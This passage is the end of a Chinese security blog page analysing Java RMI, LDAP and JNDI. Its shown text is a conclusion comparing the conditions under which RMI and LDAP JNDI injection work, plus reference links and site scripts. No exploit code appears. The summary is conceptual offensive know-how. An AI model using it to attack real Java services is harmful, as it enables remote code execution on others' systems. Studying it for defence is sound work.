<h1 id="0x05、总结"><a href="#0x05、总结" class="headerlink" title="0x05、总结"></a>0x05、总结</h1><p>可以看到LDAP的利用限制仅限制于服务器JAVA版本，没有其他限制，而RMI除了java版本限制以外，还存在利用链依赖组件条件满足才能去触发漏洞。</p>
<p>总的来说rmi和ldap的利用情况和源码层面很类似，Jndi根据不同协议进入不同的上下文处理，但在漏洞版本内都到最后进行远程调用恶意类实例化对象触发漏洞。</p>
<h1 id="0x06、参考链接"><a href="#0x06、参考链接" class="headerlink" title="0x06、参考链接"></a>0x06、参考链接</h1><p><a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/tutorial/rmi/overview.html">https://docs.oracle.com/javase/tutorial/rmi/overview.html</a><br><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1L3411a7ax/">https://www.bilibili.com/video/BV1L3411a7ax/</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9261">https://xz.aliyun.com/t/9261</a><br><a target="_blank" rel="noopener" href="https://su18.org/post/rmi-attack/">https://su18.org/post/rmi-attack/</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_35029061/article/details/126160669">https://blog.csdn.net/qq_35029061/article/details/126160669</a><br><a target="_blank" rel="noopener" href="https://daiker.gitbook.io/windows-protocol/ldap-pian/8#0x01-ldap-jian-jie">https://daiker.gitbook.io/windows-protocol/ldap-pian/8#0x01-ldap-jian-jie</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wilburxu/p/9174353.html">https://www.cnblogs.com/wilburxu/p/9174353.html</a></p>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/posts/9fa41563.html" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>上一页</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
              2023-02-09 17:00:00
            </span>
            
                  <span class="post-tags">
                    <i class="iconfont icon-tags mr-10" title="标签"></i>
                    
                    <span class="span--tag mr-8">
                      <a href="/tags/Java%E5%AE%89%E5%85%A8/" title="Java安全">
                        #Java安全
                      </a>
                    </span>
                    
                  </span>
              
          </div>
          <div class="post-foot-prev">
            
              <a href="/posts/ad3be000.html" target="_self">
                <span>下一页</span>
                <i class="iconfont icon-chevronright"></i>
              </a>
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">目录</div>
    <div class="catalog-content">
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00%E3%80%81%E5%89%8D%E8%A8%80"><span class="toc-text">0x00、前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01%E3%80%81RMI"><span class="toc-text">0x01、RMI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81RMI%E6%8F%8F%E8%BF%B0"><span class="toc-text">一、RMI描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81RMI%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0"><span class="toc-text">二、RMI简单实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-text">1、服务端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-text">2、客户端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E5%AE%9E%E7%8E%B0"><span class="toc-text">3、实现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%BA%95%E5%B1%82%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-text">三、底层调试分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%88%9B%E5%BB%BA"><span class="toc-text">1、服务端创建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E5%88%9B%E5%BB%BA"><span class="toc-text">2、注册中心创建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%B0%83%E7%94%A8%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83"><span class="toc-text">3、客户端调用注册中心</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E3%80%81%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E5%A4%84%E7%90%86%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%B0%83%E7%94%A8"><span class="toc-text">4、注册中心处理客户端调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E3%80%81%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83%E5%A4%84%E7%90%86%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%B0%83%E7%94%A8"><span class="toc-text">5、注册中心处理服务端调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6%E3%80%81%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%B0%83%E7%94%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%96%B9%E6%B3%95"><span class="toc-text">6、客户端调用远程服务器方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7%E3%80%81%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%A4%84%E7%90%86%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%BF%9C%E7%A8%8B%E8%B0%83%E7%94%A8"><span class="toc-text">7、服务端处理客户端远程调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8%E3%80%81DGC%E5%88%9B%E5%BB%BA"><span class="toc-text">8、DGC创建</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%B5%81%E7%A8%8B%E6%80%BB%E7%BB%93"><span class="toc-text">四、流程总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81RMI%E5%88%A9%E7%94%A8"><span class="toc-text">五、RMI利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E6%94%BB%E5%87%BB%E6%9C%8D%E5%8A%A1%E7%AB%AFServer"><span class="toc-text">1、攻击服务端Server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81%E6%94%BB%E5%87%BB%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83Registry"><span class="toc-text">2、攻击注册中心Registry</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E6%94%BB%E5%87%BB%E5%AE%A2%E6%88%B7%E7%AB%AFClient"><span class="toc-text">3、攻击客户端Client</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02%E3%80%81LDAP"><span class="toc-text">0x02、LDAP</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03%E3%80%81JNDI"><span class="toc-text">0x03、JNDI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81JNDI%E6%8F%8F%E8%BF%B0"><span class="toc-text">一、JNDI描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0"><span class="toc-text">二、简单实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81jndi-rmi%E5%8E%9F%E7%94%9F%E8%B0%83%E7%94%A8"><span class="toc-text">1、jndi-rmi原生调用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81References-rmi%E6%B3%A8%E5%85%A5-%E6%A0%B8%E5%BF%83"><span class="toc-text">2、References-rmi注入(核心)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81References-ldap%E6%B3%A8%E5%85%A5-%E6%A0%B8%E5%BF%83"><span class="toc-text">3、References-ldap注入(核心)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-text">三、源码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81jndi-rmi%E5%8E%9F%E7%94%9F%E8%B0%83%E7%94%A8%E5%88%86%E6%9E%90"><span class="toc-text">1、jndi-rmi原生调用分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81References-rmi%E6%B3%A8%E5%85%A5%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-text">2、References-rmi注入调试分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81References-ldap%E6%B3%A8%E5%85%A5%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-text">3、References-ldap注入调试分析</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04%E3%80%81%E4%BF%AE%E5%A4%8D%E8%8C%83%E5%9B%B4"><span class="toc-text">0x04、修复范围</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-text">0x05、总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06%E3%80%81%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">0x06、参考链接</span></a></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        




  
    <script async type="text/javascript" src="/plugins/valine.min.js" onload="loadValineSuc(this)"></script>
  

  <div id="vcomments"></div>

  <script>
    function loadValineSuc() {
      new Valine({
        el: '#vcomments',
        appId: '5WzQHrZA6gNtoCZa9qWZkFjv-gzGzoHsz',
        appKey: 'O1mOg3eUPYzPIUYEaX54ip6s',
        placeholder: 'here',
        avatar: 'monsterid',
        lang: 'zh-CN'
      })
    }
  </script>

    <style>
      .comments-container .v .vempty {
        display: none!important;
      }
    </style>




      </div>
    
  </div>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          <a title="github" target="_blank" rel="noopener" href="https://github.com/Okaytc">
            <i class="iconfont icon-github"></i>
          </a>
        </li>
      
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a href="https://okaytc.github.io/">Copyright © Okaytc 2022</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a href="https://okaytc.github.io/">一个热爱健身的脚本小子</a>
        
    </div>
  
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + java%E5%AE%89%E5%85%A8-RMI%26LDAP%26JNDI%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0 + '&url=' + https%3A%2F%2Fokaytc.github.io%2Fposts%2Fad3be040.html + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://okaytc.github.io/posts/ad3be040.html" target="_blank" title="Facebook">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  </body>
</html>
